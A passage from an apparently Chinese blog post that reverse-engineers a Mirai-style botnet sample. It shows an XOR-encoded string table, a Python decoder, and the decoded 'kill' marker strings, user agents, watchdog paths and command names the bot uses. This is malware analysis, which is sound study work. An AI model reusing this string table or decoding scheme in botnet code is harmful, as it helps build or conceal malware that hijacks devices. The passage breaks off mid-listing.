class="line"><span class="number">0x14</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x76</span>, <span class="number">0x50</span>, <span class="number">0x4B</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, </span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x16</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6B</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x72</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x71</span>, <span class="number">0x74</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, </span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x0C</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x6D</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x0F</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x52</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x4E</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x6B</span>, <span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x14</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x76</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x4B</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x6B</span>, </span><br><span class="line"><span class="number">0x67</span>, <span class="number">0x61</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x55</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x6F</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x02</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x02</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x52</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x6B</span>, </span><br><span class="line"><span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x14</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x76</span>, <span class="number">0x50</span>, <span class="number">0x4B</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x60</span>, <span class="number">0x15</span>, </span><br><span class="line"><span class="number">0x0C</span>, <span class="number">0x16</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6B</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x72</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x10</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x71</span>, <span class="number">0x74</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x17</span>, <span class="number">0x1A</span>, <span class="number">0x15</span>, <span class="number">0x1B</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x6D</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x0F</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x52</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x6B</span>, <span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x02</span>, <span class="number">0x14</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x76</span>, <span class="number">0x50</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x64</span>, <span class="number">0x57</span>, <span class="number">0x4C</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x46</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x02</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0x02</span>, <span class="number">0x7A</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x17</span>, </span><br><span class="line"><span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6B</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x02</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x7A</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, <span class="number">0x4B</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, </span><br><span class="line"><span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x02</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0x02</span>, <span class="number">0x7A</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, <span class="number">0x4B</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x16</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x6B</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x02</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0x02</span>, <span class="number">0x7A</span>, </span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x7D</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, </span><br><span class="line"><span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, <span class="number">0x4B</span>, <span class="number">0x50</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6F</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x43</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, </span><br><span class="line"><span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x51</span>, <span class="number">0x02</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x14</span>, </span><br><span class="line"><span class="number">0x16</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x5A</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x63</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x4A</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x14</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, </span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#lsit1 = [&#x27;0&#x27;, &#x27;3&#x27;, &#x27;16&#x27;, &#x27;19&#x27;, &#x27;35&#x27;, &#x27;43&#x27;, &#x27;49&#x27;, &#x27;61&#x27;, &#x27;66&#x27;, &#x27;74&#x27;, &#x27;83&#x27;, &#x27;94&#x27;, &#x27;106&#x27;, &#x27;122&#x27;, &#x27;139&#x27;, &#x27;154&#x27;, &#x27;166&#x27;, &#x27;172&#x27;, &#x27;178&#x27;, &#x27;195&#x27;, &#x27;210&#x27;, &#x27;220&#x27;, &#x27;240&#x27;, &#x27;264&#x27;, &#x27;279&#x27;, &#x27;299&#x27;, &#x27;323&#x27;, &#x27;339&#x27;, &#x27;348&#x27;, &#x27;360&#x27;, &#x27;370&#x27;, &#x27;377&#x27;, &#x27;383&#x27;, &#x27;394&#x27;, &#x27;411&#x27;, &#x27;422&#x27;, &#x27;428&#x27;, &#x27;434&#x27;, &#x27;440&#x27;, &#x27;447&#x27;, &#x27;455&#x27;, &#x27;463&#x27;, &#x27;467&#x27;, &#x27;486&#x27;, &#x27;510&#x27;, &#x27;520&#x27;]</span></span><br><span class="line"><span class="comment">#list2 = [&#x27;2&#x27;, &#x27;12&#x27;, &#x27;2&#x27;, &#x27;29&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;11&#x27;, &#x27;4&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;10&#x27;, &#x27;11&#x27;, &#x27;15&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;11&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;9&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;14&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;15&#x27;, &#x27;8&#x27;, &#x27;11&#x27;, &#x27;9&#x27;, &#x27;6&#x27;, &#x27;5&#x27;, &#x27;10&#x27;, &#x27;15&#x27;, &#x27;10&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;7&#x27;, &#x27;3&#x27;, &#x27;18&#x27;, &#x27;23&#x27;, &#x27;9&#x27;, &#x27;16&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>():</span></span><br><span class="line">msg_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> cipher1:</span><br><span class="line">char = <span class="built_in">chr</span>(_ ^ <span class="number">34</span>)</span><br><span class="line"><span class="keyword">if</span> char == <span class="string">&quot;\0&quot;</span>:</span><br><span class="line">msg_str = msg_str + <span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg_str = msg_str + char</span><br><span class="line">length = <span class="built_in">len</span>(list1)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">print(msg_str[<span class="built_in">int</span>(list1[_]):<span class="built_in">int</span>(list1[_])+<span class="built_in">int</span>(list2[_])])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">func1()</span><br></pre></td></tr></table></figure><p>这样就得到了表格每项的数据，再把源码的表格解密一下，两边的数据顺序大致上是对得上的<br />多余的部分基本上就是字符串KILL特征了，特征如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">dvrHelper\x00</span><br><span class="line">NiGGeR69xd\x00</span><br><span class="line">1337SoraLOADER\x00</span><br><span class="line">NiGGeRd0nks1337\x00</span><br><span class="line">X19I239124UIU\x00</span><br><span class="line">IuYgujeIqn\x00</span><br><span class="line">14Fa\x00</span><br><span class="line">ccAD\x00</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route\x00</span><br><span class="line">&#x2F;proc&#x2F;cpuinfo\x00</span><br><span class="line">BOGOMIPS\x00</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc.local\x00</span><br><span class="line">g1abc4dmo35hnp2lie0kjf\x00</span><br><span class="line">&#x2F;dev&#x2F;watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;misc&#x2F;watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;FTWDT101_watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;netslink&#x2F;\x00</span><br><span class="line">PRIVMSG\x00</span><br><span class="line">GETLOCALIP\x00</span><br><span class="line">KILLATTK\x00</span><br><span class="line">Eats8\x00</span><br><span class="line">v[0v\x00</span><br><span class="line">93OfjHZ2z\x00</span><br><span class="line">GhostWuzHere666</span><br><span class="line">WsGA4@F6F\x00</span><br><span class="line">ACDB\x00</span><br><span class="line">AbAd\x00</span><br><span class="line">iaGv\x00</span><br></pre></td></tr></table></figure><p>BTW：若出现<code>\x00</code>则为必要的，C语言程序中输出&quot;KEY{dvrHelper}&quot;不会触发KILL机制，输出&quot;dvrHelper&quot;则会</p><p>但是还是要验证一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 